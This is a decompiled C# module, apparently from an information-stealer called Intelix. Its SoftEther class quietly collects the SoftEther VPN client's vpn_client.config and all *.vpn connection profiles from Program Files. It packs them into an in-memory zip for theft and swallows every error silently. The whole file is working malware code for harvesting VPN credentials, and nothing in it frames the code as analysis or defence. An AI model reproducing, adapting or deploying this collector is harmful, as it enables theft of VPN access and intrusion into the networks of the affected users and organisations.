using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x02000014 RID: 20
	public class SoftEther : ITarget
	{
		// Token: 0x0600003B RID: 59 RVA: 0x00003470 File Offset: 0x00001670
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "SoftEther VPN Client");
			bool flag = !Directory.Exists(text);
			if (!flag)
			{
				string path = "SoftEther";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "SoftEther VPN";
				string text2 = Path.Combine(text, "vpn_client.config");
				bool flag2 = File.Exists(text2);
				if (flag2)
				{
					try
					{
						string text3 = Path.Combine("Vpn", path, "vpn_client.config");
						zip.AddFile(text3, File.ReadAllBytes(text2));
						counterApplications.Files.Add(text2 + " => " + text3);
					}
					catch
					{
					}
				}
				string[] files = Directory.GetFiles(text, "*.vpn", SearchOption.TopDirectoryOnly);
				foreach (string text4 in files)
				{
					try
					{
						string fileName = Path.GetFileName(text4);
						string text5 = Path.Combine("Vpn", path, fileName);
						zip.AddFile(text5, File.ReadAllBytes(text4));
						counterApplications.Files.Add(text4 + " => " + text5);
					}
					catch
					{
					}
				}
				bool flag3 = counterApplications.Files.Count > 0;
				if (flag3)
				{
					counterApplications.Files.Add(Path.Combine("Vpn", path));
					counter.Vpns.Add(counterApplications);
				}
			}
		}
	}
}
